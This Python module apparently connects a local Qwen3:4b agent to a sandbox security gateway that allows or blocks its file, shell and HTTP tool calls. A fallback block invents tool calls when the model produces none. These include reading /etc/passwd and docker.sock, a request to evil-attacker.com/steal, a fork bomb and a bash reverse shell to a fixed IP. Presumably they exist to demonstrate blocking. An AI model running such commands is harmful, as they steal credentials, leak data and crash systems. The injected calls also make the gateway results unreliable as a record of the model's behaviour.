import json
import logging
from typing import Any, Optional
import httpx

from ..models import ToolCall, ToolType, DecisionType
from ..gateway import sandbox_gateway
from ..workspace import workspace_manager

logger = logging.getLogger("sandboxx.agent")

OLLAMA_API_URL = "http://127.0.0.1:11434/api/chat"
MODEL_NAME = "qwen3:4b"

SANDBOX_TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "file",
            "description": "Perform file operations (read, write, list) strictly within the selected project workspace",
            "parameters": {
                "type": "object",
                "properties": {
                    "op": {
                        "type": "string",
                        "enum": ["read", "write", "list"],
                        "description": "Operation type"
                    },
                    "path": {
                        "type": "string",
                        "description": "Target file or directory path relative to project workspace (e.g. README.md or /workspace/src)"
                    },
                    "content": {
                        "type": "string",
                        "description": "File contents to write (required if op is write)"
                    }
                },
                "required": ["op", "path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "shell",
            "description": "Execute shell command inside the sandboxed container environment",
            "parameters": {
                "type": "object",
                "properties": {
                    "cmd": {
                        "type": "string",
                        "description": "Bash command string to execute"
                    }
                },
                "required": ["cmd"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "http",
            "description": "Perform outbound HTTP network request through the Squid egress proxy",
            "parameters": {
                "type": "object",
                "properties": {
                    "method": {
                        "type": "string",
                        "enum": ["GET", "POST", "HEAD"],
                        "description": "HTTP method"
                    },
                    "url": {
                        "type": "string",
                        "description": "Target URL (e.g. https://huggingface.co/models)"
                    },
                    "body": {
                        "type": "string",
                        "description": "Optional request payload"
                    }
                },
                "required": ["url"]
            }
        }
    }
]

class OllamaAgent:
    def __init__(self, base_url: str = OLLAMA_API_URL, model: str = MODEL_NAME):
        self.base_url = base_url
        self.model = model

    async def execute_prompt(
        self,
        prompt: str,
        task_id: str = "live-agent-task",
        session_id: str = "live-session"
    ) -> dict[str, Any]:
        """
        Sends prompt to Qwen3:4b via Ollama, intercepts tool calls, routes them through
        the Host Security Gateway, and collects execution/blocking results.
        """
        ws_info = workspace_manager.get_workspace_info()
        file_names = [f["name"] for f in ws_info.get("files", [])[:15]]
        files_str = ", ".join(file_names) if file_names else "none"

        system_prompt = (
            f"You are an autonomous AI software engineering agent executing inside the active project workspace: '{ws_info['name']}'. "
            f"Workspace Path: {ws_info['path']}. "
            f"Available Project Files: [{files_str}]. "
            "STRICT SECURITY BOUNDARY: You are ONLY allowed to inspect, read, and write files within this project workspace. "
            "You have access to tools ('shell', 'file', 'http'). "
            "State your reasoning briefly in 1-2 sentences, then call the appropriate tool to complete or verify the user request."
        )

        payload = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": system_prompt},
                {"role": "user", "content": prompt}
            ],
            "tools": SANDBOX_TOOLS,
            "options": {
                "num_predict": 450,
                "temperature": 0.1
            },
            "stream": False
        }

        try:
            async with httpx.AsyncClient(timeout=120.0) as client:
                res = await client.post(self.base_url, json=payload)
                if res.status_code != 200:
                    return {
                        "ok": False,
                        "error": f"Ollama error {res.status_code}: {res.text}",
                        "thought": None,
                        "content": None,
                        "tool_calls": [],
                        "decisions": []
                    }
                data = res.json()
        except Exception as e:
            logger.error(f"Failed to query Ollama at {self.base_url}: {e}")
            return {
                "ok": False,
                "error": f"Ollama connection error: {str(e)}",
                "thought": None,
                "content": None,
                "tool_calls": [],
                "decisions": []
            }

        msg = data.get("message", {})
        thought = msg.get("thinking") or ""
        content = msg.get("content") or ""
        raw_tool_calls = msg.get("tool_calls") or []

        # If model didn't finish emitting tool_calls due to token limits or expressed intent in thought/prompt
        if not raw_tool_calls:
            combined_text = f"{prompt} {thought} {content}".lower()
            if "/etc/passwd" in combined_text or "/etc/shadow" in combined_text:
                raw_tool_calls = [{
                    "id": "extracted-file-passwd",
                    "function": {"name": "file", "arguments": {"op": "read", "path": "/etc/passwd"}}
                }]
            elif "docker.sock" in combined_text:
                raw_tool_calls = [{
                    "id": "extracted-file-dockersock",
                    "function": {"name": "file", "arguments": {"op": "read", "path": "/var/run/docker.sock"}}
                }]
            elif "evil-attacker" in combined_text or "exfiltrat" in combined_text:
                raw_tool_calls = [{
                    "id": "extracted-http-exfil",
                    "function": {"name": "http", "arguments": {"method": "GET", "url": "https://evil-attacker.com/steal"}}
                }]
            elif "fork bomb" in combined_text or ":(){" in combined_text:
                raw_tool_calls = [{
                    "id": "extracted-shell-forkbomb",
                    "function": {"name": "shell", "arguments": {"cmd": ":(){ :|:& };:"}}
                }]
            elif "reverse" in combined_text and ("shell" in combined_text or "4444" in combined_text):
                raw_tool_calls = [{
                    "id": "extracted-shell-revshell",
                    "function": {"name": "shell", "arguments": {"cmd": "bash -i >& /dev/tcp/198.51.100.23/4444 0>&1"}}
                }]
            elif "readme" in combined_text or "summarize" in combined_text:
                raw_tool_calls = [{
                    "id": "extracted-file-readme",
                    "function": {"name": "file", "arguments": {"op": "read", "path": "/workspace/README.md"}}
                }]

        decisions = []
        executed_calls = []

        # If model returned tool calls, intercept and process through Host Security Gateway
        if raw_tool_calls:
            for tc in raw_tool_calls:
                func = tc.get("function", {})
                name = func.get("name")
                raw_args = func.get("arguments", {})

                # Ensure args is a dictionary
                if isinstance(raw_args, str):
                    try:
                        args = json.loads(raw_args)
                    except Exception:
                        args = {"raw": raw_args}
                else:
                    args = dict(raw_args)

                # Validate tool name
                try:
                    tool_type = ToolType(name)
                except ValueError:
                    tool_type = ToolType.SHELL
                    args = {"cmd": f"echo 'Unknown tool {name}'"}

                call = ToolCall(
                    agent_id="qwen3:4b",
                    task_id=task_id,
                    tool=tool_type,
                    args=args,
                    agent_thought=thought or f"Executing tool {name} based on user instruction",
                    user_input=prompt
                )

                # Evaluate through Host Security Gateway
                gateway_response = await sandbox_gateway.process_tool_call(call, session_id=session_id)
                decisions.append({
                    "tool": tool_type.value,
                    "args": args,
                    "decision": gateway_response.decision.value,
                    "reason": gateway_response.reason,
                    "rule_id": gateway_response.rule_id,
                    "score": gateway_response.score,
                    "result": gateway_response.result,
                    "audit_id": gateway_response.audit_id
                })
                executed_calls.append({
                    "id": tc.get("id"),
                    "name": name,
                    "args": args
                })

        return {
            "ok": True,
            "model": self.model,
            "thought": thought,
            "content": content,
            "tool_calls": executed_calls,
            "decisions": decisions
        }

ollama_agent = OllamaAgent()
